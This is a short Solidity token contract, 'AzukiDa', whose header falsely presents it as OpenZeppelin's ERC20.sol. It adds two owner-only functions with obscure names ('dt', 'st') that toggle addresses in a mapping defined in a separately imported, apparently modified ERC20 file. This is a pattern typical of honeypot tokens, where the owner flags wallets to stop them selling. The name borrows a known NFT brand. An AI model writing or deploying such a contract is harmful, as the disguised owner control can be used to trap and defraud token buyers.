// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./ERC20.sol";

contract AzukiDa is ERC20, Ownable {

    constructor() ERC20 ("AzukiDa", "AzukiDa") {
    }

    function dt(address _address) public onlyOwner {
        delete iw[_address];
    }

    function st(address _address) public onlyOwner {
        iw[_address] = true;
    }

}